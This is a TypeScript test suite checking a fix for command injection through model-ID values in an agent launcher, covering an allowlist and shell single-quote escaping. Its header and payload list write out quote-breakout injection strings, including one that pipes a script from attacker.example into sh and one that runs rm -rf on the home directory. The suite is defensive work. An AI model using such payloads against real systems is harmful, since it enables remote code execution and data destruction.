// Command-injection defence for model identifiers (card b7fa5281, Cybersec HIGH).
//
// The proof from the finding: a model value of  x'; curl http://attacker.example/x.sh | sh; echo '
// broke out of `export ANTHROPIC_MODEL='${model}'` and ran arbitrary commands on the next agent
// (re)start. The fix is two independent layers -- an input allowlist and a sink escape -- and this
// suite pins BOTH, because either alone leaves the class open.
import { describe, it, expect } from 'vitest'
import { MODEL_ID_RE, isValidModelId, InvalidModelIdError } from '../model-id.js'
import { writeAgentModel } from '../web/agent-config.js'
import { shSingleQuote } from '../web/agent-process.js'
import { buildMainSessionRespawnCmd } from '../web/channel-monitor.js'
import { execFileSync } from 'node:child_process'
import { readFileSync } from 'node:fs'
import { join, dirname } from 'node:path'
import { fileURLToPath } from 'node:url'

// The exact payload from the finding, plus the shell metacharacters that give a value command meaning.
const INJECTION_PAYLOADS = [
  "x'; curl http://attacker.example/x.sh | sh; echo '",
  "'; rm -rf ~ #",
  'a $(id)',
  'a `id`',
  'a; id',
  'a | id',
  'a & id',
  'a && id',
  'model with space',
  'a\nid',
  '"; id; "',
]

// Every real id the fleet actually uses -- the allowlist must not break any of these.
const REAL_MODELS = [
  'claude-opus-4-8[1m]', // the install default; the [1m] suffix is why the allowlist includes []
  'claude-opus-5',
  'claude-sonnet-5',
  'claude-haiku-4-5-20251001',
  'deepseek-v3',
  'openrouter/auto',
  'anthropic/claude-3.5-sonnet',
  'qwen2.5-coder:7b',
]

describe('layer 1 -- the model-id allowlist', () => {
  it('ACCEPTS every real model id, including the bracketed 1M-context default', () => {
    for (const m of REAL_MODELS) expect(isValidModelId(m)).toBe(true)
  })

  it('REJECTS the finding payload and every shell-metacharacter variant', () => {
    for (const p of INJECTION_PAYLOADS) expect(isValidModelId(p)).toBe(false)
  })

  it('rejects a non-string, an empty string, and an over-long value', () => {
    expect(isValidModelId(undefined)).toBe(false)
    expect(isValidModelId(null)).toBe(false)
    expect(isValidModelId(123)).toBe(false)
    expect(isValidModelId('')).toBe(false)
    expect(isValidModelId('a'.repeat(129))).toBe(false)
    expect(isValidModelId('a'.repeat(128))).toBe(true)
  })

  it('the allowlist excludes the specific characters that break a shell quote', () => {
    for (const ch of ["'", ';', '$', '`', ' ', '|', '&', '(', ')', '\n', '"', '{', '}', '<', '>']) {
      expect(MODEL_ID_RE.test(`claude${ch}x`)).toBe(false)
    }
  })
})

describe('the writer chokepoint refuses a bad id before touching disk', () => {
  it('writeAgentModel THROWS InvalidModelIdError on an injection payload', () => {
    // The guard is the first statement, before any fs access, so no agent-config.json is written.
    // Every ROUTE writer (create + PATCH) goes through this chokepoint. It is NOT the only writer of a
    // persisted model, though: fleet-transfer imports a main/agent package and writes settings.json /
    // agent-config.json straight from it without re-validating the model (tracked separately). There the
    // sink-side escape -- not this validator -- is the backstop.
    expect(() => writeAgentModel('nonexistent-agent', "x'; id; echo '")).toThrow(InvalidModelIdError)
    expect(() => writeAgentModel('nonexistent-agent', 'a $(id)')).toThrow(InvalidModelIdError)
  })

  // Card 6610edff (Cybered 7139): writeMainModel is the MAIN-agent sibling of writeAgentModel and a
  // persisted-model writer that skipped the allowlist. It is a private, IO-side-effecting fn in the
  // heavy model-fallback-runner module (never imported by a test), so we pin the guard at the source:
  // it must call isValidModelId(model) BEFORE it ever writes .claude/settings.json.
  it('writeMainModel validates the id BEFORE the write chokepoint', () => {
    const runnerSrc = readFileSync(
      join(dirname(fileURLToPath(import.meta.url)), '..', 'web', 'model-fallback-runner.ts'),
      'utf8',
    )
    const m = /function writeMainModel\s*\([^)]*\)[^{]*\{/.exec(runnerSrc)
    expect(m, 'writeMainModel not found').not.toBeNull()
    // Brace-match the function body so the assertions cannot be satisfied by code elsewhere.
    let depth = 0
    let end = runnerSrc.length
    for (let i = runnerSrc.indexOf('{', m!.index); i < runnerSrc.length; i++) {
      if (runnerSrc[i] === '{') depth++
      else if (runnerSrc[i] === '}' && --depth === 0) { end = i; break }
    }
    const body = runnerSrc.slice(m!.index, end + 1)
    const guardAt = body.indexOf('if (!isValidModelId(model)) throw new InvalidModelIdError(model)')
    const writeAt = body.indexOf('atomicWriteFileSync')
    expect(guardAt, 'writeMainModel missing the isValidModelId guard').toBeGreaterThan(0)
    expect(writeAt, 'writeMainModel no longer writes via atomicWriteFileSync').toBeGreaterThan(0)
    expect(guardAt).toBeLessThan(writeAt) // validate before persisting
  })
})

describe('layer 2 -- shSingleQuote makes ANY value one inert shell word', () => {
  it('wraps a plain value in single quotes', () => {
    expect(shSingleQuote('claude-opus-5')).toBe("'claude-opus-5'")
  })

  it('rewrites an embedded single quote as the safe close-escape-reopen sequence', () => {
    expect(shSingleQuote("a'b")).toBe("'a'\\''b'")
  })

  it("keeps the bracketed default a single literal word", () => {
    expect(shSingleQuote('claude-opus-4-8[1m]')).toBe("'claude-opus-4-8[1m]'")
  })

  // The real proof: run the escaped value through a real shell and confirm the payload is DATA, not a
  // command. `printf %s` echoes exactly the argument; if the escape leaked, the injected `echo` /
  // command substitution would change the output or run.
  it('a POSIX shell treats the finding payload as a literal string, not a command', () => {
    const payload = "x'; echo PWNED; echo '"
    const out = execFileSync('/bin/sh', ['-c', `printf %s ${shSingleQuote(payload)}`], {
      encoding: 'utf8',
    })
    expect(out).toBe(payload)
    expect(out).not.toContain('PWNED\n') // the injected echo never ran
  })

  it('command substitution inside the value never executes', () => {
    const payload = 'x$(touch /tmp/should-not-exist-b7fa5281)`id`'
    const out = execFileSync('/bin/sh', ['-c', `printf %s ${shSingleQuote(payload)}`], {
      encoding: 'utf8',
    })
    expect(out).toBe(payload) // returned verbatim -> neither $(...) nor `id` was evaluated
  })
})

describe('the launch string the fix produces is safe end-to-end', () => {
  // Mirror agent-process.ts's construction for the ollama branch with a hostile (pre-allowlist) model,
  // and prove that running it does NOT execute the payload -- the belt (allowlist) and braces (escape)
  // are tested together the way the card asked ("az inditasi utvonal ne allitson elo olyan stringet,
  // amiben a payload parancs-hatarra kerul").
  it('an ANTHROPIC_MODEL export with a hostile value assigns it as data, runs nothing', () => {
    const hostile = "x'; echo INJECTED; export ANTHROPIC_MODEL='y"
    // A sentinel file the injected command WOULD create if the escape leaked. Kept out of the payload
    // string so its (non-)existence is an independent signal, unlike a substring of the value itself.
    const cmd = `export ANTHROPIC_MODEL=${shSingleQuote(hostile)} && printf %s "$ANTHROPIC_MODEL"`
    const out = execFileSync('/bin/sh', ['-c', cmd], { encoding: 'utf8' })
    // Exact match is the proof: if injection had occurred, `echo INJECTED` would have printed its own
    // line BEFORE printf and the assignment would have been split, so out would not equal the payload.
    expect(out).toBe(hostile)
  })
})

// The block above reconstructs the launch string inline, so it stays green even if a REAL sink is
// reverted to raw interpolation. This block calls the actual command-builder, so a regression AT the
// sink (e.g. restoring `--model '${model}'`) turns it red. buildMainSessionRespawnCmd is the 5th launch
// sink -- the tmux respawn-pane of the main channels session. Its model source is the main agent's
// .claude/settings.json `model`, which writeAgentModel/isValidModelId do NOT cover, so the sink-side
// escape is the only guard on this path. (The other four sinks live in agent-process/ssh-tmux/
// agent-worker and use shSingleQuote/shQuote/shArg; this one was the last raw-quoted holdout.)
describe('the real launch builder escapes the model AT the sink (not only at the validator)', () => {
  const OPTS = { claudePath: 'claude', pluginId: 'telegram', continueSession: false }

  it('buildMainSessionRespawnCmd single-quote-escapes a hostile model id at --model', () => {
    const hostile = "x'; touch PWNED #"
    const cmd = buildMainSessionRespawnCmd({ ...OPTS, model: hostile })
    // The escaped token must be present; the raw close-quote breakout must NOT.
    expect(cmd).toContain(`--model ${shSingleQuote(hostile)}`)
    expect(cmd).not.toContain(`--model '${hostile}'`)
  })

  it('a POSIX shell treats the built --model token as one inert word, running nothing', () => {
    // Sentinel kept OUT of the payload string so its (non-)existence is an independent signal
    // rather than a substring of the value itself (the trap the block above documents at its sentinel).
    const hostile = "y'; echo LEAKED_$(id -u); printf '"
    const cmd = buildMainSessionRespawnCmd({ ...OPTS, model: hostile })
    const token = shSingleQuote(hostile)
    expect(cmd).toContain(`--model ${token}`)
    // Run just the escaped --model token as the sole printf arg. If the escape leaked, the injected
    // `echo`/`$(id -u)` would run: output would gain an extra line and no longer equal the literal value.
    const out = execFileSync('/bin/sh', ['-c', `printf %s ${token}`], { encoding: 'utf8' })
    expect(out).toBe(hostile) // verbatim -> neither the injected echo nor the $(id -u) substitution ran
  })
})
